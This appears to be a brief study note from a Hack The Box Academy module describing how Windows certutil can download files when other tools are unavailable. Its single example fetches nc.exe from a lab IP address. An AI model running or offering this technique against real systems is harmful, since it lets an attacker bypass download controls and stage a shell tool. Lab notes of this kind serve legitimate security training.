Using Certutil to download
##########################

Date: 2024-11-04 11:00

Status:

Tags:

Description
*************

Certutil can be used to download a file when other options are not
available

Example:

.. code-block:: console

   C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe

References
************
https://academy.hackthebox.com/module/24/section/1575
